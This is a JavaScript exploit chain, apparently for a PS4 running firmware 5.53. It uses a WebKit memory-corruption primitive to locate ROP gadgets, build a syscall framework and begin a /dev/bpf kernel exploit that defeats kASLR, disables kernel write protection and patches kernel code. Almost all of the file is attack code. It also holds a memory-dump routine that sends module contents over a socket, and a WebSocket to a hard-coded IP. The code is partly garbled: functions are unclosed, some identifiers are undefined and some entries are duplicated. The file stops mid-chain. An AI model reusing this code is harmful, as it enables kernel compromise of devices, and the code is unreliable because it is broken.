var p;
var xhr_sync_log = function(str) {
    "use strict";
    var xhr = new XMLHttpRequest();
    xhr.open("GET", url, false);
    xhr.send(null);
}
var findModuleBaseXHR = function(addr)
{
    var addr_ = addr.add32(0); // copy
    addr_.low &= 0xFFFFF000;
    xhr_sync_log("START: " + addr_);
    
    while (1) {
        var vr = p.read4(addr_.add32(0x110-4));
        xhr_sync_log("step" + addr_);
        addr_.sub32inplace(0x1000);
    }
}
var log = function(x) {
    document.getElementById("console").innerText += x + "\n";
}
var print = function(string) { // like log but html
    document.getElementById("console").innerHTML += string + "\n";
}

var dumpModuleXHR = function(moduleBase) {
    var chunk = new ArrayBuffer(0x1000);
    var chunk32 = new Uint32Array(chunk);
    var chunk8 = new Uint8Array(chunk);
    
    connection.binaryType = "arraybuffer";
    var helo = new Uint32Array(1);
    helo[0] = 0x41414141;
    
    var moduleBase_ = moduleBase.add32(0);
    connection.onmessage = function() {
        try {
            for (var i = 0; i < chunk32.length; i++)
            {
                var val = p.read4(moduleBase_);
                chunk32[i] = val;
                moduleBase_.add32inplace(4);
            }
            connection.send(chunk8);
        } catch (e) {
            print(e);
        }
    }
}
var get_jmptgt = function(addr) {
  var z = p.read4(addr) & 0xFFFF;
  var y = p.read4(addr.add32(2));

  if (z != 0x25FF) return 0;
  
  return addr.add32(y + 6);
}



var reenter_help = { length:
    { valueOf: function(){
        return 0;
    }
}};


window.stage2 = function() {
    try {
        window.stage2_();
    } catch (e) {
        print(e);
    }
}
/* For storing the gadget and import map */
window.GadgetMap = [];
window.slowpath_jop = [];

/* Simply adds given offset to given module's base address */
function getGadget(moduleName, offset) {
    return add2(window.ECore.moduleBaseAddresses[moduleName], offset);
}

/* All function stubs / imports from other modules */
var slowpath_jop = function() {
    window.basicImportMap = {
        '5.53-01': {
            'setjmp': getGadget('libSceWebKit2', 0x14F8), // setjmp imported from libkernel
            '__stack_chk_fail_ptr': getGadget('libSceWebKit2', 0x384BA40), // pointer to pointer to stack_chk_fail imported from libkernel -> look at epilogs to find this
            "sceKernelLoadStartModule": getGadget('libkernel', 0x31470), // dump libkernel using the stack_chk_fail pointer to find base, then look for _sceKernelLoadStartModule
        }
    };
}

var gadgetmap_wk = function() {
    gadgetnames = {
        '5.53-01': {
            'pop rsi': getGadget('libSceWebKit2', 0x0008f38a), // 0x000000000008f38a : pop rsi ; ret // 5ec3
            'pop rdi': getGadget('libSceWebKit2', 0x00038dba), // pop rdi ; ret
            'pop rax': getGadget('libSceWebKit2', 0x000043f5), // pop rax ; ret
            'pop rcx': getGadget('libSceWebKit2', 0x00052e59), // pop rcx ; ret
            'pop rdx': getGadget('libSceWebKit2', 0x000dedc2), // pop rdx ; ret
            'pop r8': getGadget('libSceWebKit2', 0x000179c5), // pop r8 ; ret
            'pop r9': getGadget('libSceWebKit2', 0x00bb30cf), // pop r9 ; ret
            'pop rsp': getGadget('libSceWebKit2', 0x0001e687), // pop rsp ; ret
            'push rax': getGadget('libSceWebKit2', 0x0017778e), // push rax ; ret  ;
            'mov rax, rdi': getGadget('libSceWebKit2', 0x000058d0), // mov rax, rdi ; ret
            'mov rax, rdx': getGadget('libSceWebKit2', 0x001cee60), // 0x00000000001cee60 : mov rax, rdx ; ret // 4889d0c3
            'add rax, rcx': getGadget('libSceWebKit2', 0x00015172), // add rax, rcx ; ret
            'mov qword ptr [rdi], rax': getGadget('libSceWebKit2', 0x0014536b), // mov qword ptr [rdi], rax ; ret 
            'mov qword ptr [rdi], rsi': getGadget('libSceWebKit2', 0x00023ac2), // mov qword ptr [rdi], rsi ; ret
            'mov rax, qword ptr [rax]': getGadget('libSceWebKit2', 0x0006c83a), // mov rax, qword ptr [rax] ; ret
            'ret': getGadget('libSceWebKit2', 0x0000003c), // ret  ;
            'nop': getGadget('libSceWebKit2', 0x00002f8f), // 0x0000000000002f8f : nop ; ret // 90c3

            'syscall': getGadget('libSceWebKit2', 0x2264DBC), // syscall  ; ret

            'jmp rax': getGadget('libSceWebKit2', 0x00000082), // jmp rax ;
            'jmp r8': getGadget('libSceWebKit2', 0x00201860), // jmp r8 ;
            'jmp r9': getGadget('libSceWebKit2', 0x001ce976), // jmp r9 ;
            'jmp r11': getGadget('libSceWebKit2', 0x0017e73a), // jmp r11 ;
            'jmp r15': getGadget('libSceWebKit2', 0x002f9f6d), // jmp r15 ;
            'jmp rbp': getGadget('libSceWebKit2', 0x001fb8bd), // jmp rbp ;
            'jmp rbx': getGadget('libSceWebKit2', 0x00039bd2), // jmp rbx ;
            'jmp rcx': getGadget('libSceWebKit2', 0x0000dee3), // jmp rcx ;
            'jmp rdi': getGadget('libSceWebKit2', 0x000b479c), // jmp rdi ;
            'jmp rdx': getGadget('libSceWebKit2', 0x0000e3d0), // jmp rdx ;
            'jmp rsi': getGadget('libSceWebKit2', 0x0002e004), // jmp rsi ;
            'jmp rsp': getGadget('libSceWebKit2', 0x0029e6ad), // jmp rsp ;

            // 0x013d1a00 : mov rdi, qword ptr [rdi] ; mov rax, qword ptr [rdi] ; mov rax, qword ptr [rax] ; jmp rax // 488b3f488b07488b00ffe0   
            // 0x00d65230: mov rdi, qword [rdi+0x18] ; mov rax, qword [rdi] ; mov rax, qword [rax+0x58] ; jmp rax ;  // 48 8B 7F 18 48 8B 07 48  8B 40 58 FF E0
            'jmp addr': getGadget('libSceWebKit2', 0x00d65230),
        }
    };
}
 var gadgetcache = {
      /*
      kchain.push(window.gadgets["pop rax"]);
      kchain.push(savectx.add32(0x30));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(kernel_slide);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rdi"]);
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov [rdi], rax"]);
      */
"ret":                    0x0000003C,
"jmp rax":                0x00000082,
"ep":                     0x000000AD,
"pop rbp":                0x000000B6,
"mov [rdi], rax":             782172,
"pop r8":                 0x0000CC42,
"pop rax":                     17781,
"mov rax, rdi":                23248,
"mov rax, [rax]":         0x000130A3,
"pop rsi":                    597265,
"pop rdi":                    239071,
"add rsi, rcx; jmp rsi":  0x001FA5D4,
"pop rcx":                0x00271DE3,
"pop rsp":                    128173,
"mov [rdi], rsi":             150754,
"mov [rax], rsi":         0x003D0877,
"add rsi, rax; jmp rsi":  0x004E040C,
"pop rcx":                0x00271DE3,
"jop":                        813600,
"pop rdx":                0x00565838,
"pop r9":                 0x0078BA1F,
"add rax, rcx":           0x0084D04D,
"infloop":                0x012C4009,

"stack_chk_fail":         0x000000C8,
"memcpy":                 0x000000F8,
"setjmp":                 0x000014f8
},

 gadgeton = {};

window.stage2_ = function() {
    p = window.prim;
    print ("[+] exploit succeeded");
    print("webkit exploit result: " + p.leakval(0x41414141));
    print ("--- welcome to stage2 ---");
    p.leakfunc = function(func)
    {
        var fptr_store = p.leakval(func);
        return (p.read8(fptr_store.add32(0x18))).add32(0x40);
    }
 gadgetconn = 0;
    if (!gadgetcache)
        gadgetconn = new WebSocket('ws://10.17.0.1:8080');

    var parseFloatStore = p.leakfunc(parseFloat);
    var parseFloatPtr = p.read8(parseFloatStore);
    print("parseFloat at: 0x" + parseFloatPtr);
    var webKitBase = p.read8(parseFloatStore);
    window.webKitBase = webKitBase;
    
    webKitBase.low &= 0xfffff000;
    webKitBase.sub32inplace(0x5b7000-0x1C000);
    
    print("libwebkit base at: 0x" + webKitBase);
    
    var o2wk = function(o)
    {
        return webKitBase.add32(o);
    }

    gadgets = {
        "stack_chk_fail": o2wk(0xc8),
        "memset": o2wk(0x228),
        "setjmp": o2wk(0x14f8)
    };
   
/*
    var libSceLibcInternalBase = p.read8(get_jmptgt(gadgets['stack_chk_fail']));
    libSceLibcInternalBase.low &= ~0x3FFF;
    libSceLibcInternalBase.sub32inplace(0x20000);
    print("libSceLibcInternal: 0x" + libSceLibcInternalBase.toString());
    window.libSceLibcInternalBase = libSceLibcInternalBase;
*/

    var jmpGadget = get_jmptgt(gadgets.stack_chk_fail);
    if(!jmpGadget)
        return;

    var libKernelBase = p.read8(get_jmptgt(gadgets.stack_chk_fail));
    window.libKernelBase = libKernelBase;
    libKernelBase.low &= 0xfffff000;
    libKernelBase.sub32inplace(0x12000);
    print("libkernel_web base at: 0x" + libKernelBase);
    
    
    var o2lk = function(o)
    {
        return libKernelBase.add32(o);
    }
    window.o2lk = o2lk;
    
    var wkview = new Uint8Array(0x1000);
    var wkstr = p.leakval(wkview).add32(0x10);
    var orig_wkview_buf = p.read8(wkstr);
    
    p.write8(wkstr, webKitBase);
    p.write4(wkstr.add32(8), 0x367c000);
    
    var gadgets_to_find = 0;
    var gadgetnames = [];
    for (var gadgetname in gadgetmap_wk) {
        if (gadgetmap_wk.hasOwnProperty(gadgetname)) {
            gadgets_to_find++;
            gadgetnames.push(gadgetname);
            gadgetmap_wk[gadgetname].reverse();
        }
    }
    log("finding gadgets");
    
    gadgets_to_find++; // slowpath_jop
    var findgadget = function(donecb) {
        if (gadgetcache)
        {
            gadgets_to_find=0;
            slowpath_jop=0;
            log("using gadgets");
            
            for (var gadgetname in gadgetcache) {
                if (gadgetcache.hasOwnProperty(gadgetname)) {
                    gadgets[gadgetname] = o2wk(gadgetcache[gadgetname]);
                }
            }
            
        } else {
            for (var i=0; i < wkview.length; i++)
            {
                if (wkview[i] == 0xc3)
                {
                    for (var nl=0; nl < gadgetnames.length; nl++)
                    {
                        var found = 1;
                        if (!gadgetnames[nl]) continue;
                        var gadgetbytes = gadgetmap_wk[gadgetnames[nl]];
                        for (var compareidx = 0; compareidx < gadgetbytes.length; compareidx++)
                        {
                            if (gadgetbytes[compareidx] != wkview[i - compareidx]){
                                found = 0;
                                break;
                            }
                        }
                        if (!found) continue;
                        gadgets[gadgetnames[nl]] = o2wk(i - gadgetbytes.length + 1);
                        
                        delete gadgetnames[nl];
                        gadgets_to_find--;
                    }
                } else if (wkview[i] == 0xe0 && wkview[i-1] == 0xff && slowpath_jop)
                {
                    var found = 1;
                    for (var compareidx = 0; compareidx < slowpath_jop.length; compareidx++)
                    {
                        if (slowpath_jop[compareidx] != wkview[i - compareidx])
                        {
                            found = 0;
                            break;
                        }
                    }
                    if (!found) continue;
                    gadgets["jop"] = o2wk(i - slowpath_jop.length + 1);
                    gadgetoffs["jop"] = i - slowpath_jop.length + 1;
                    gadgets_to_find--;
                    slowpath_jop = 0;
                }
                
                if (!gadgets_to_find) break;
            }
        }
        if (!gadgets_to_find && !slowpath_jop) {
            log("found gadgets");
            if (gadgetconn)
                gadgetconn.onopen = function(e){
                    gadgetconn.send(JSON.stringify(gadgetoffs));
                }
                setTimeout(donecb, 50);
        } else {
            log("missing gadgets: ");
            for (var nl in gadgetnames) {
                log(" - " + gadgetnames[nl]);
            }
            if(slowpath_jop) log(" - jop gadget");
        }
    }
  // Setup ROP launching
    findgadget(function(){});
    var hold1;
    var hold2;
    var holdz;
    var holdz1;

    while (1) {
      hold1 = {a:0, b:0, c:0, d:0};
      hold2 = {a:0, b:0, c:0, d:0};
      holdz1 = p.leakval(hold2);
      holdz = p.leakval(hold1);
      if (holdz.low - 0x30 == holdz1.low) break;
    }

    var pushframe = [];
    pushframe.length = 0x80;
    var funcbuf;

    var launch_chain = function(chain)
    {
      var stackPointer = 0;
      var stackCookie = 0;
      var orig_reenter_rip = 0;
        
        var reenter_help = {length: {valueOf: function(){
            orig_reenter_rip = p.read8(stackPointer);
            stackCookie = p.read8(stackPointer.add32(8));
            var returnToFrame = stackPointer;
            
            var ocnt = chain.count;
            chain.push_write8(stackPointer, orig_reenter_rip);
            chain.push_write8(stackPointer.add32(8), stackCookie);
            
            if (chain.runtime) returnToFrame=chain.runtime(stackPointer);
            
            chain.push(gadgets["pop rsp"]); // pop rsp
            chain.push(returnToFrame); // -> back to the trap life
            chain.count = ocnt;
            
            p.write8(stackPointer, (gadgets["pop rsp"])); // pop rsp
            p.write8(stackPointer.add32(8), chain.ropframeptr); // -> rop frame
        }}};
        
        var funcbuf32 = new Uint32Array(0x100);
        nogc.push(funcbuf32);
        funcbuf = p.read8(p.leakval(funcbuf32).add32(0x10));
        
        p.write8(funcbuf.add32(0x30), gadgets["setjmp"]);
        p.write8(funcbuf.add32(0x80), gadgets["jop"]);
        p.write8(funcbuf,funcbuf);
        p.write8(parseFloatStore, gadgets["jop"]);
        var orig_hold = p.read8(holdz1);
        var orig_hold48 = p.read8(holdz1.add32(0x48));
        
        p.write8(holdz1, funcbuf.add32(0x50));
        p.write8(holdz1.add32(0x48), funcbuf);
        parseFloat(hold2,hold2,hold2,hold2,hold2,hold2);
        p.write8(holdz1, orig_hold);
        p.write8(holdz1.add32(0x48), orig_hold48);
        
        stackPointer = p.read8(funcbuf.add32(0x10));
        rtv=Array.prototype.splice.apply(reenter_help);
        return p.leakval(rtv);
    }

    p.loadchain = launch_chain;
  
    
     // Write to address with value (helper function)
  this.write64 = function (addr, val) {
    this.push(window.gadgets["pop rdi"]);
    this.push(addr);
    this.push(window.gadgets["pop rax"]);
    this.push(val);
    this.push(window.gadgets["mov [rdi], rax"]);
  }
   
    window.RopChain = function () {
        this.ropframe = new Uint32Array(0x10000);
        this.ropframeptr = p.read8(p.leakval(this.ropframe).add32(0x10));
        this.count = 0;
        this.clear = function() {
            this.count = 0;
            this.runtime = undefined;
            for (var i = 0; i < 0x1000/8; i++)
            {
                p.write8(this.ropframeptr.add32(i*8), 0);
            }
        };
        this.pushSymbolic = function() {
            this.count++;
            return this.count-1;
        }
        this.finalizeSymbolic = function(idx, val) {
            p.write8(this.ropframeptr.add32(idx*8), val);
        }
        this.push = function(val) {
            this.finalizeSymbolic(this.pushSymbolic(), val);
        }
         this.push_write8 = function(where, what)
  {
      this.push(gadgets["pop rdi"]); // pop rdi
      this.push(where); // where
      this.push(gadgets["pop rsi"]); // pop rsi
      this.push(what); // what
      this.push(gadgets["mov [rdi], rsi"]); // perform write
  }
       this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9)
  {
    if (rdi != undefined) {
      this.push(gadgets["pop rdi"]); // pop rdi
      this.push(rdi); // what
    }
    if (rsi != undefined) {
      this.push(gadgets["pop rsi"]); // pop rsi
      this.push(rsi); // what
    }
    if (rdx != undefined) {
      this.push(gadgets["pop rdx"]); // pop rdx
      this.push(rdx); // what
    }
    if (rcx != undefined) {
      this.push(gadgets["pop rcx"]); // pop r10
      this.push(rcx); // what
    }
    if (r8 != undefined) {
      this.push(gadgets["pop r8"]); // pop r8
      this.push(r8); // what
    }
    if (r9 != undefined) {
      this.push(gadgets["pop r9"]); // pop r9
      this.push(r9); // what*/
    }

    this.push(rip); // jmp
    return this;
  }
        
        this.run = function() {
      var retv = p.loadchain(this, this.notimes);
      this.clear();
      return retv;
  }
  
  return this;
};
    var RopChain = window.RopChain();
    window.syscallnames = {"exit": 1,
    "fork": 2,
    "read": 3,
    "write": 4,
    "open": 5,
    "close": 6,
    "wait4": 7,
    "unlink": 10,
    "chdir": 12,
    "chmod": 15,
    "getpid": 20,
    "setuid": 23,
    "getuid": 24,
    "geteuid": 25,
    "recvmsg": 27,
    "sendmsg": 28,
    "recvfrom": 29,
    "accept": 30,
    "getpeername": 31,
    "getsockname": 32,
    "access": 33,
    "chflags": 34,
    "fchflags": 35,
    "sync": 36,
    "kill": 37,
    "stat": 38,
    "getppid": 39,
    "dup": 41,
    "pipe": 42,
    "getegid": 43,
    "profil": 44,
    "getgid": 47,
    "getlogin": 49,
    "setlogin": 50,
    "sigaltstack": 53,
    "ioctl": 54,
    "reboot": 55,
    "revoke": 56,
    "execve": 59,
    "execve": 59,
    "msync": 65,
    "munmap": 73,
    "mprotect": 74,
    "madvise": 75,
    "mincore": 78,
    "getgroups": 79,
    "setgroups": 80,
    "setitimer": 83,
    "getitimer": 86,
    "getdtablesize": 89,
    "dup2": 90,
    "fcntl": 92,
    "select": 93,
    "fsync": 95,
    "setpriority": 96,
    "socket": 97,
    "connect": 98,
    "accept": 99,
    "getpriority": 100,
    "send": 101,
    "recv": 102,
    "bind": 104,
    "setsockopt": 105,
    "listen": 106,
    "recvmsg": 113,
    "sendmsg": 114,
    "gettimeofday": 116,
    "getrusage": 117,
    "getsockopt": 118,
    "readv": 120,
    "writev": 121,
    "settimeofday": 122,
    "fchmod": 124,
    "recvfrom": 125,
    "setreuid": 126,
    "setregid": 127,
    "rename": 128,
    "flock": 131,
    "sendto": 133,
    "shutdown": 134,
    "socketpair": 135,
    "mkdir": 136,
    "rmdir": 137,
    "utimes": 138,
    "adjtime": 140,
    "getpeername": 141,
    "setsid": 147,
    "sysarch": 165,
    "setegid": 182,"seteuid": 183,
    "stat": 188,
    "fstat": 189,
    "lstat": 190,
    "pathconf": 191,
    "fpathconf": 192,
    "getrlimit": 194,
    "setrlimit": 195,
    "getdirentries": 196,
    "__sysctl": 202,
    "mlock": 203,
    "munlock": 204,
    "futimes": 206,
    "poll": 209,
    "clock_gettime": 232,
    "clock_settime": 233,
    "clock_getres": 234,
    "ktimer_create": 235,
    "ktimer_delete": 236,
    "ktimer_settime": 237,
    "ktimer_gettime": 238,
    "ktimer_getoverrun": 239,
    "nanosleep": 240,
    "rfork": 251,
    "issetugid": 253,
    "getdents": 272,
    "preadv": 289,
    "pwritev": 290,
    "getsid": 310,
    "aio_suspend": 315,
    "mlockall": 324,
    "munlockall": 325,
    "sched_setparam": 327,
    "sched_getparam": 328,
    "sched_setscheduler": 329,
    "sched_getscheduler": 330,
    "sched_yield": 331,
    "sched_get_priority_max": 332,
    "sched_get_priority_min": 333,
    "sched_rr_get_interval": 334,
    "utrace": 335,
    "sigprocmask": 340,
    "sigsuspend": 341,
    "sigpending": 343,
    "sigtimedwait": 345,
    "sigwaitinfo": 346,
    "kqueue": 362,
    "kevent": 363,
    "uuidgen": 392,
    "sendfile": 393,
    "fstatfs": 397,
    "ksem_close": 400,
    "ksem_post": 401,
    "ksem_wait": 402,
    "ksem_trywait": 403,
    "ksem_init": 404,
    "ksem_open": 405,
    "ksem_unlink": 406,
    "ksem_getvalue": 407,
    "ksem_destroy": 408,
    "sigaction": 416,
    "sigreturn": 417,
    "getcontext": 421,
    "setcontext": 422,
    "swapcontext": 423,
    "sigwait": 429,
    "thr_create": 430,
    "thr_exit": 431,
    "thr_self": 432
    ,"thr_kill": 433,
    "ksem_timedwait": 441,
    "thr_suspend": 442,
    "thr_wake": 443,
    "kldunloadf": 444,
    "_umtx_op": 454,
    "thr_new": 455,
    "sigqueue": 456,
    "thr_set_name": 464,
    "rtprio_thread": 466,
    "pread": 475,
    "pwrite": 476,
    "mmap": 477,
    "lseek": 478,
    "truncate": 479,
    "ftruncate": 480,
    "thr_kill2": 481,
    "shm_open": 482,
    "shm_unlink": 483,
    "cpuset_getid": 486,
    "cpuset_getaffinity": 487,
    "cpuset_setaffinity": 488,
    "openat": 499,
    "pselect": 522,  
    "regmgr_call": 532,
    "jitshm_create": 533,
    "jitshm_alias": 534,
    "dl_get_list": 535,
    "dl_get_info": 536,
    "dl_notify_event": 537,
    "evf_create": 538,
    "evf_delete": 539,
    "evf_open": 540,
    "evf_close": 541,
    "evf_wait": 542,
    "evf_trywait": 543,
    "evf_set": 544,
    "evf_clear": 545,
    "evf_cancel": 546,
    "query_memory_protection": 47,
    "batch_map": 548,
    "osem_create": 549,
    "osem_delete": 550,
    "osem_open": 551,
    "osem_close": 552,
    "osem_wait": 553,
    "osem_trywait": 554,
    "osem_post": 555,
    "sys_osem_cancel": 556,
    "namedobj_create": 557,
    "namedobj_delete": 558,
    "set_vm_container": 559,
    "debug_init": 560,
    "suspend_process": 561,
    "resume_process": 562,
    "opmc_enable": 563,
    "opmc_disable": 564,
    "opmc_set_ctl": 565,
    "opmc_set_ctr": 566,
    "opmc_get_ctr": 567,
    "budget_create": 568,
    "budget_delete": 569,
    "budget_get": 570,
    "budget_set": 571,
    "virtual_query": 572,
    "mdbg_call": 573,
    "sblock_create": 574,
    "sblock_delete": 575,
    "sblock_enter": 576,
    "sblock_exit": 577,
    "sblock_xenter": 578,
    "sblock_xexit": 579,
    "eport_create": 580,
    "eport_delete": 581,
    "eport_trigger": 582,
    "eport_open": 583,
    "eport_close": 584,
    "is_in_sandbox": 585,
    "dmem_container": 586,
    "get_authinfo": 587,
    "mname": 588,
    "dynlib_dlopen": 589,
    "dynlib_dlclose": 590,
    "dynlib_dlsym": 591,
    "dynlib_get_list": 592,
    "dynlib_get_info": 593,
    "dynlib_load_prx": 594,
    "dynlib_unload_prx": 595,
    "dynlib_do_copy_relocations": 596,
    "dynlib_prepare_dlclose": 597,
    "dynlib_get_proc_param": 598,
    "dynlib_process_needed_and_relocate": 599,
    "sandbox_path": 600,
    "mdbg_service": 601,
    "randomized_path": 602,
    "rdup": 603,
    "dl_get_metadata": 604,
    "workaround8849": 605,
    "is_development_mode": 606,
    "get_self_auth_info": 607,
    "dynlib_get_info_ex": 608,
    "budget_get_ptype": 610,
    "budget_getid": 609,
    "get_paging_stats_of_all_threads": 611,
    "get_proc_type_info": 612,
    "get_resident_count": 613,
    "prepare_to_suspend_process": 614,
    "get_resident_fmem_count": 615,
    "thr_get_name": 616,
    "set_gpo": 617,
    "thr_suspend_ucontext": 632,
    "thr_resume_ucontext": 633,
    "thr_get_ucontext": 634}    


       /* Get syscall name by index */
function swapkeyval(json){
  var ret = {};
  for(var key in json){
    if (json.hasOwnProperty(key)) {
      ret[json[key]] = key;
    }
  }
  return ret;
}
    
    window.nameforsyscall = swapkeyval(window.syscallnames);
    
    window.syscalls = {};

 
    log("--- welcome to stage 3: Trigger---");
    
    var kview = new Uint8Array(0x1000);
    var kstr = p.leakval(kview).add32(0x10);
    var orig_kview_buf = p.read8(kstr);
    
    p.write8(kstr, window.libKernelBase);
    p.write4(kstr.add32(8), 0x40000); // high enough lel
    
    var countbytes;
    for (var i=0; i < 0x40000; i++)
    {
        if (kview[i] == 0x72 && kview[i+1] == 0x64 && kview[i+2] == 0x6c && kview[i+3] == 0x6f && kview[i+4] == 0x63)
        {
            countbytes = i;
            break;
        }
    }
    p.write4(kstr.add32(8), countbytes + 32);
    
    var dview32 = new Uint32Array(1);
    var dview8 = new Uint8Array(dview32.buffer);
    for (var i=0; i < countbytes; i++)
    {
        if (kview[i] == 0x48 && kview[i+1] == 0xc7 && kview[i+2] == 0xc0 && kview[i+7] == 0x49 && kview[i+8] == 0x89 && kview[i+9] == 0xca && kview[i+10] == 0x0f && kview[i+11] == 0x05)
        {
            dview8[0] = kview[i+3];
            dview8[1] = kview[i+4];
            dview8[2] = kview[i+5];
            dview8[3] = kview[i+6];
            var syscallno = dview32[0];
            window.syscalls[syscallno] = window.libKernelBase.add32(i);
        }
    }
       var chain = new window.RopChain;
    
    p.fcall = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
        chain.clear();
        
        chain.notimes = this.next_notime;
        this.next_notime = 1;
        
        chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
        
        chain.push(window.gadgets["pop rdi"]); // pop rdi
        chain.push(chain.ropframeptr.add32(0x3ff8)); // where
        chain.push(window.gadgets["mov [rdi], rax"]); // rdi = rax
        
        chain.push(window.gadgets["pop rax"]); // pop rax
        chain.push(p.leakval(0x41414242)); // where
        
        if (chain.run().low != 0x41414242) throw new Error("unexpected rop behaviour");
        returnvalue = p.read8(chain.ropframeptr.add32(0x3ff8)); //p.read8(chain.ropframeptr.add32(0x3ff8));
    }
    
    
    p.readstr = function(addr){
        var addr_ = addr.add32(0); // copy
        var rd = p.read4(addr_);
        var buf = "";
        while (rd & 0xFF)
        {
            buf += String.fromCharCode(rd & 0xFF);
            addr_.add32inplace(1);
            rd = p.read4(addr_);
        }
        return buf;
    }
    
    p.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9)
    {
        if (typeof sysc == "string") {
            sysc = window.syscallnames[sysc];
        }
        if (typeof sysc != "number") {
            throw new Error("invalid syscall");
        }
        
        var off = window.syscalls[sysc];
        if (off == undefined)
        {
            throw new Error("invalid syscall");
        }
        
        return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
    }
    
    p.writeString = function (addr, str)
    {
      for (var i = 0; i < str.length; i++)
      {
        var byte = p.read4(addr.add32(i));
        byte &= 0xFFFF0000;
        byte |= str.charCodeAt(i);
        p.write4(addr.add32(i), byte);
      }
    }
    
     p.readString = function(addr)
    {
      var byte = p.read4(addr);
      var str  = "";
      while (byte & 0xFF)
      {
        str += String.fromCharCode(byte & 0xFF);
        addr.add32inplace(1);
        byte = p.read4(addr);
      }
      return str;
    }
    function malloc(size)
{
  var backing = new Uint8Array(0x10000 + size);

  window.nogc.push(backing);
  
      var spawnthread = function (chain) {
      var longjmp       = offsetToWebKit(0x1458);
      var createThread  = offsetToWebKit(0x116ED40);

      var contextp = mallocu32(0x2000);
      var contextz = contextp.backing;
      contextz[0] = 1337;
      p.syscall(324, 1);
  
      var thread2 = new window.rop();

      thread2.clear();
      thread2.push(window.gadgets["ret"]); // nop
      thread2.push(window.gadgets["ret"]); // nop
      thread2.push(window.gadgets["ret"]); // nop

      thread2.push(window.gadgets["ret"]); // nop
      chain(thread2);

      p.write8(contextp, window.gadgets["ret"]); // rip -> ret gadget
      p.write8(contextp.add32(0x10), thread2.ropframe); // rsp

      var test = p.fcall(createThread, longjmp, contextp, stringify("GottaGoFast"));

      window.nogc.push(contextz);
      window.nogc.push(thread2);
      
      return thread2;
      }
      
      var run_count = 0;

    function kernel_rop_run(fd, scratch) {
      // wait for it
      while (1) {
        var ret = p.syscall("write", fd, scratch, 0x200);
        run_count++;
        if (ret.low == 0x200) {
            return ret;
        }
      }
    }
      // Clear errno
    p.write8(offsetToLibKernel(0x7CCF0), 0);
    
    
    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // KERNEL EXPLOIT BEGINS /////////////////////////////////////////////////////////////////////////////////////////////
    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    //alert("OHHH WE'RE HALFWAY THERE WOOOOOOAHHH LIVIN ON A PRAYER")
    
    var test = p.syscall("setuid", 0);

    // Check if homebrew has already been enabled, if not, run kernel exploit :D
    if(test != '0') {
      /////////////////// STAGE 1: Setting Up Programs ///////////////////


      var spadp = mallocu32(0x2000);

      // Open first device and bind
      var fd1 = p.syscall("open", stringify("/dev/bpf"), 2, 0); // 0666 permissions, open as O_RDWR

      if(fd1 < 0) {
        throw "Failed to open first /dev/bpf device!";
      }
      
      p.syscall("ioctl", fd1, 0x8020426C, stringify("eth0")); // 8020426C = BIOCSETIF

      if (p.syscall("write", fd1, spadp, 40).low == (-1 >>> 0)) {
        p.syscall("ioctl", fd1, 0x8020426C, stringify("wlan0"));

        if (p.syscall("write", fd1, spadp, 40).low == (-1 >>> 0)) {
          throw "Failed to bind to first /dev/bpf device!";
        }
      }

      // Open second device and bind
      var fd2 = p.syscall("open", stringify("/dev/bpf"), 2, 0); // 0666 permissions, open as O_RDWR

      if(fd2 < 0) {
        throw "Failed to open second /dev/bpf device!";
      }

      p.syscall("ioctl", fd2, 0x8020426C, stringify("eth0")); // 8020426C = BIOCSETIF

      if (p.syscall("write", fd2, spadp, 40).low == (-1 >>> 0)) {
        p.syscall("ioctl", fd2, 0x8020426C, stringify("wlan0"));

        if (p.syscall("write", fd2, spadp, 40).low == (-1 >>> 0)) {
          throw "Failed to bind to second /dev/bpf device!";
        }
      }

      // Setup kchain stack for kernel ROP chain
      var kchainstack = malloc(0x2000);
      
      /////////////////// STAGE 2: Building Kernel ROP Chain ///////////////////
      var kchain  = new krop(p, kchainstack);
      var savectx = malloc(0x200);

      // NOP Sled
      kchain.push(window.gadgets["ret"]);
      kchain.push(window.gadgets["ret"]);
      kchain.push(window.gadgets["ret"]);
      kchain.push(window.gadgets["ret"]);
      kchain.push(window.gadgets["ret"]);
      kchain.push(window.gadgets["ret"]);
      kchain.push(window.gadgets["ret"]);
      kchain.push(window.gadgets["ret"]);

      // Save context to exit back to userland when finished
      kchain.push(window.gadgets["pop rdi"]);
      kchain.push(savectx);
      kchain.push(offsetToLibc(0x1D3C));

      // Defeat kASLR (resolve kernel .text base)
      var kernel_slide = new int64(-0x2610AD0, -1);
      kchain.push(window.gadgets["pop rax"]);
      kchain.push(savectx.add32(0x30));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(kernel_slide);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rdi"]);
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov [rdi], rax"]);
        
      // Disable kernel write protection
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x280f79);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(offsetToWebKit(0x12a16)); // mov rdx, rax
      kchain.push(window.gadgets["pop rax"]);
      kchain.push(0x80040033);
      kchain.push(offsetToWebKit(0x1517c7)); // jmp rdx

      // Add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
      // E8 C8 37 13 00 41 89 C6 -> B8 00 00 00 00 41 89 C6
      var kexploit_check_patch = new int64(0x000000B8, 0xC6894100);
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x1144E3);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rsi"]);
      kchain.push(kexploit_check_patch);
      kchain.push(window.gadgets["mov [rax], rsi"]);

      // Patch sys_mmap: Allow RWX (read-write-execute) mapping
